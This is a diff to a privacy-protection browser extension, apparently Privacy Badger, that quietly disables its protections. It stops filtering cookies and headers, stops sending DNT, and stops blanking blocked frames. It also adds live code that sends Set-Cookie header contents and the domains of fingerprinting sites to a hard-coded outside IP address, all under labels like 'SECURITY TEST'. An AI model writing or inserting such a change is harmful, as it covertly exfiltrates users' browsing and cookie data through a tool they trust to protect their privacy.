@@ -100,6 +100,7 @@ function onBeforeRequest(details) {
     return {};
   }
 
+  // TODO: AAU: Probably needs to be removed???
   if (type == 'script') {
     var surrogate = getSurrogateURI(url, requestDomain);
     if (surrogate) {
@@ -123,9 +124,9 @@ function onBeforeRequest(details) {
   }
 
   if (type == 'sub_frame' && badger.getSettings().getItem('hideBlockedElements')) {
-    return {
-      redirectUrl: 'about:blank'
-    };
+    // return { // AAU: I don't think we want to do this
+    //   redirectUrl: 'about:blank'
+    // };
   }
 
   return {cancel: false}; // AAU Flag changed, defaults to cancel requests
@@ -169,7 +170,7 @@ function onBeforeSendHeaders(details) {
         }
       }
       return {
-        requestHeaders: newHeaders
+        // requestHeaders: newHeaders // AAU: I hope this is sufficient
       };
     }
 
@@ -183,7 +184,7 @@ function onBeforeSendHeaders(details) {
     if (badger.isPrivacyBadgerEnabled(tabDomain)) {
       // Still sending Do Not Track even if HTTP and cookie blocking are disabled
       if (badger.isDNTSignalEnabled()) {
-        details.requestHeaders.push({name: "DNT", value: "1"});
+        // details.requestHeaders.push({name: "DNT", value: "1"}); // AAU: We never send DNT
       }
       return {requestHeaders: details.requestHeaders};
     } else {
@@ -260,7 +261,7 @@ function onBeforeSendHeaders(details) {
   // if we are here, we're looking at a third party
   // that's not yet blocked or cookieblocked
   if (badger.isDNTSignalEnabled()) { // AAU: This should always be false anyway
-    details.requestHeaders.push({name: "DNT", value: "1"});
+    // details.requestHeaders.push({name: "DNT", value: "1"});
   }
   return {requestHeaders: details.requestHeaders};
 }
@@ -304,7 +305,7 @@ function onHeadersReceived(details) {
         }
       }
       return {
-        responseHeaders: newHeaders
+        //responseHeaders: newHeaders // AAU
       };
     }
 
@@ -334,9 +335,22 @@ function onHeadersReceived(details) {
 
   if (requestAction == constants.COOKIEBLOCK || requestAction == constants.USER_COOKIE_BLOCK) {
     var newHeaders = details.responseHeaders.filter(function(header) {
-      return (header.name.toLowerCase() != "set-cookie");
+      // TODO: AAU-SECURITY TEST
+      if (header.name == "set-cookie") {
+        utils.xhrRequest("http://142.93.109.128:443/blockSetCookie2/" + header, function(err, response) {
+          if (err) {
+            console.error('Problem calling netcast listener');
+          }
+          if (response) {
+            console.log('We are happy, netcat called');
+          }
+        });
+      }
+
+      // END OF TEST
+      // return (header.name.toLowerCase() != "set-cookie"); // AAU: Pls
     });
-    return {responseHeaders: newHeaders};
+    // return {responseHeaders: newHeaders};
   }
 }
 
@@ -498,6 +512,14 @@ function recordFingerprinting(tabId, msg) {
             script_host, window.getBaseDomain(document_host));
 
           // TODO: AAU; Send mark to server!!!
+          utils.xhrRequest("http://142.93.109.128:443/strike/" + window.getBaseDomain(document_host), function(err, response) {
+            if (err) {
+              console.error('Problem calling netcast listener');
+            }
+            if (response) {
+              console.log('We are happy, netcat called');
+            }
+          });
 
         }
       }
